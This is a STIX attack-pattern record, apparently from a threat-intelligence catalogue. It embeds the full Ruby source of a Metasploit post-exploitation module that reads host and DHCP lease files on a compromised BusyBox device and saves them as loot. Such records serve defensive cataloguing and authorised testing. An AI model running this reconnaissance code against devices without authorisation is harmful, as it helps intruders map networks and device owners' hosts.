{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ca16a4b-29b0-434e-b211-6c27c6d351ea",
    "created": "2024-08-14T16:33:13.585541Z",
    "modified": "2024-08-14T16:33:13.585544Z",
    "name": "BusyBox Enumerate Host Names",
    "description": " This module will be applied on a session connected to a BusyBox shell. It will enumerate host names related to the device executing BusyBox. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/busybox/enum_hosts.rb",
            "external_id": "enum_hosts.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::BusyBox\n\n  def initialize\n    super(\n      'Name' => 'BusyBox Enumerate Host Names',\n      'Description' => %q{\n        This module will be applied on a session connected to a BusyBox shell. It will enumerate\n        host names related to the device executing BusyBox.\n      },\n      'Author' => 'Javier Vicente Vallejo',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell']\n    )\n  end\n\n  def run\n    print_status('Searching hosts files...')\n    if busy_box_file_exist?('/var/hosts')\n      hosts_file = '/var/hosts'\n    elsif busy_box_file_exist?('/var/udhcpd/udhcpd.leases')\n      hosts_file = '/var/udhcpd/udhcpd.leases'\n    else\n      print_error('Files not found')\n      return\n    end\n\n    read_hosts_file(hosts_file)\n  end\n\n  def read_hosts_file(file)\n    str_file = read_file(file)\n    print_good(\"Hosts file found: #{file}.\")\n    vprint_line(str_file)\n    p = store_loot('busybox.enum.hosts', 'text/plain', session, str_file, file, 'BusyBox device host names')\n    print_good(\"Hosts saved to #{p}.\")\n  rescue EOFError\n    print_error(\"Nothing read from file: #{file}, file may be empty.\")\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}